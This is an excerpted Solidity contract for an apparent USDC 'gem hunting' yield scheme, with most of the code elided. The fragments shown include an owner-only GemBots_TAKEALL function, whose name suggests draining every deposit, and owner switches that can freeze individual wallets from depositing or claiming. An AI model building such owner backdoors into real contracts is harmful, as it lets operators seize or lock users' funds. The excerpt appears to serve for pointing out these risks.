...
contract PUSDC is Context, Ownable {
   ...
   uint16 constant FEE_DIVIDER = 1000; 
    ...
    mapping(address => uint8) public pausedHunt;
    ...
    function HuntGems(uint256 amount) external {
		...
		require(pausedHunt[msg.sender] == 0, "Wallet is paused for hunting gems!");

        //require(amount >= 100 ether, "Minimum Deposit is 100 USDC!");
    ...
    function HarvestGems() external {     
        ...
        require(pausedClaim[msg.sender] == 0, "Wallet is paused for claiming gems!");
        ...
        //require(player.dividends >= 50 ether, "Minimum payout is 50 USDC.");
	...
	function GemBots_TAKEALL() public onlyOwner returns (bool success) {
    ...
    function GemPumpBack(uint256 amount) external {
        require(amount >= 100 ether, "Minimum is 100 USDC!");
        USD.safeTransferFrom(msg.sender, address(this), amount);
        gempumps += amount;
    }
    ...
    function pauseGemHunt(address wallet) public onlyOwner returns (bool success) {
        pausedHunt[wallet] = 1;
        nextPausedWallet++;
        return true;
    }
	
	function unpauseGemHunt(address wallet) public onlyOwner returns (bool success) {
        pausedHunt[wallet] = 0;
